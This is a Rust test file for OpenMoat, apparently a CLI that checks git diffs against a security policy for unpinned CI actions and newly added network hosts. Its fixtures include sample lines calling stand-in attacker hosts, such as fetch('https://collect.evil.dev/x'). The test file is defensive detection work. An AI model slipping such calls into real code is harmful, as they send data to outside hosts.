//! Content findings as the CLI reports them: the line, the level the policy
//! sets, and new hosts decided by the compiled policy.

use openmoat_core::{DEFAULT_POLICY, Policy};

use super::{added, check, edit};
use crate::commands::policy::diff::gate::{Gate, Level};
use crate::commands::policy::diff::{output, parse};

const WORKFLOW_LINE: &str = "      - uses: actions/checkout@v4";

#[test]
fn a_content_finding_names_the_added_line_and_annotates_it() {
    let found = check(&edit(".github/workflows/ci.yml", WORKFLOW_LINE));
    let f = found
        .iter()
        .find(|f| f.rules.iter().any(|r| r == "diff-ci-unpinned"))
        .unwrap();
    assert_eq!((f.level, f.line), (Level::Review, Some(2)), "{found:#?}");
    assert!(
        output::annotation(f).starts_with(
            "::warning file=.github/workflows/ci.yml,line=2,title=OpenMoat review%3A diff-ci-unpinned::"
        ),
        "{}",
        output::annotation(f)
    );
    // the path finding stays as it was, at file level
    assert!(
        found
            .iter()
            .any(|f| f.line.is_none() && f.rules.iter().any(|r| r == "runs-later"))
    );
}

#[test]
fn the_policy_sets_each_content_rules_level() {
    let yaml = format!(
        "{DEFAULT_POLICY}\ncheck_diff:\n  levels:\n    diff-ci-unpinned: off\n    diff-new-host: deny\n"
    );
    let policy = Policy::parse(&yaml).unwrap();
    let gate = Gate::new(&policy, &[]).unwrap();
    let diff = edit(".github/workflows/ci.yml", WORKFLOW_LINE)
        + &added("src/a.ts", "100644", "fetch('https://collect.evil.dev/x')");
    let found = gate.check(&parse::parse(&diff).unwrap());
    assert!(
        !found
            .iter()
            .any(|f| f.rules.iter().any(|r| r == "diff-ci-unpinned")),
        "{found:#?}"
    );
    let host = found.iter().find(|f| f.rules == ["diff-new-host"]).unwrap();
    assert_eq!(
        (host.level, host.path.as_str(), host.line),
        (Level::Deny, "src/a.ts", Some(1))
    );
}

#[test]
fn a_new_host_is_one_the_policy_does_not_allow() {
    let diff = added(
        "src/a.ts",
        "100644",
        "fetch('https://registry.npmjs.org/x'); fetch('https://evil.dev/y')",
    );
    let found = check(&diff);
    let hosts: Vec<&str> = found
        .iter()
        .filter(|f| f.rules == ["diff-new-host"])
        .map(|f| f.reasons[0].as_str())
        .collect();
    assert_eq!(hosts.len(), 1, "{found:#?}");
    assert!(hosts[0].contains("evil.dev"), "{hosts:?}");
}

#[test]
fn a_deleted_or_binary_file_adds_nothing_to_check() {
    let deleted = "diff --git a/package-lock.json b/package-lock.json\ndeleted file mode 100644\n\
        index 1111111..0000000\n--- a/package-lock.json\n+++ /dev/null\n@@ -1,2 +0,0 @@\n\
        -  \"version\": \"1.0.0\",\n-      \"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n";
    let found = check(deleted);
    assert!(!found.iter().any(|f| f.line.is_some()), "{found:#?}");
    // a file moved with --no-renames: its hosts were there before
    let moved = "diff --git a/src/old.ts b/src/old.ts\ndeleted file mode 100644\n--- a/src/old.ts\n\
        +++ /dev/null\n@@ -1 +0,0 @@\n-fetch('https://api.acme.dev/x')\n"
        .to_owned()
        + &added("src/new.ts", "100644", "fetch('https://api.acme.dev/x')");
    assert!(!check(&moved).iter().any(|f| f.rules == ["diff-new-host"]));
}

#[test]
fn the_parser_keeps_each_block_of_removed_and_added_lines() {
    let diff = "--- a/x\n+++ b/x\n@@ -1,5 +1,5 @@\n a\n-b\n+B\n c\n-d\n+D\n+E\n-f\n";
    let files = parse::parse(diff).unwrap();
    let blocks = &files[0].blocks;
    assert_eq!(blocks.len(), 2, "{blocks:#?}");
    assert_eq!(
        (
            blocks[0].at,
            blocks[0].removed.as_slice(),
            blocks[0].added.clone()
        ),
        (2, &["b".to_owned()][..], 0..1)
    );
    assert_eq!(blocks[1].removed, ["d", "f"]);
    assert_eq!(blocks[1].added, 1..3);
    assert_eq!(files[0].added[2], (5, "E".to_owned()));
    // a block of added lines only holds all of them
    let new = "--- /dev/null\n+++ b/y\n@@ -0,0 +1,2 @@\n+one\n+two\n";
    let files = parse::parse(new).unwrap();
    assert_eq!(files[0].blocks.len(), 1);
    assert_eq!(
        (files[0].blocks[0].at, files[0].blocks[0].added.clone()),
        (1, 0..2)
    );
}
